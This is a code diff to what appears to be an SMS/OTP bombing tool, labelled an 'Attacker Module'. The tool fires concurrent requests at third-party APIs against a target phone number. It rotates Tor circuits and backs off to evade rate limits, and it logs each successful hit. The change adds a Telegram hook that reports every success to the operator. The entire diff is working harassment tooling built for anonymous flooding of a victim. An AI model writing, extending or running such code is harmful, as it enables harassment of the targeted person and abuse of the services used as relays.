@@ -18,7 +18,7 @@ from .tor_manager import get_tor_proxy, renew_circuit
     
 # v43 Attacker Module (Smart Backoff + Hot Reload)
     
-async def start_async_attack(apis, number, duration=60, concurrency=50, delay=0.5):
+async def start_async_attack(apis, number, duration=60, concurrency=50, delay=0.5, log_callback=None):
     # v17000: Global Circuit Rotation Counter
     REQUESTS_SINCE_ROTATION = 0
     ROTATION_THRESHOLD = 50 
@@ -145,7 +145,7 @@ async def start_async_attack(apis, number, duration=60, concurrency=50, delay=0.
                     current_proxy = None
                 
                 # v41: Backoff Wrapper
-                tasks.append(asyncio.create_task(smart_send_attack(session, api, number, formatted_number, current_proxy, COOLDOWN_MAP)))
+                tasks.append(asyncio.create_task(smart_send_attack(session, api, number, formatted_number, current_proxy, COOLDOWN_MAP, log_callback)))
                 
             await asyncio.gather(*tasks)
             
@@ -160,7 +160,7 @@ async def start_async_attack(apis, number, duration=60, concurrency=50, delay=0.
     
     # Stop Tor to save battery? No, keep it running for next attack. 
 
-async def smart_send_attack(session, api, number, formatted_number, proxy_url, cooldown_map):
+async def smart_send_attack(session, api, number, formatted_number, proxy_url, cooldown_map, log_callback=None):
     name = api.get("name")
     url = api.get("url")
     method = api.get("method", "POST")
@@ -235,6 +235,14 @@ async def smart_send_attack(session, api, number, formatted_number, proxy_url, c
                     log_path = os.path.join(os.path.dirname(__file__), '../logs/success.txt')
                     loop = asyncio.get_running_loop()
                     await loop.run_in_executor(None, lambda: open(log_path, "a").write(f"{number} | {name} | {time.ctime()}\n"))
+                    
+                    # v70: Telegram Hook
+                    if log_callback:
+                        log_msg = f"✅ {name} -> {number} [{status_msg}]"
+                        if asyncio.iscoroutinefunction(log_callback):
+                            await log_callback(log_msg)
+                        else:
+                            await loop.run_in_executor(None, log_callback, log_msg)
                 except: pass
                 
                 from .brain import feedback
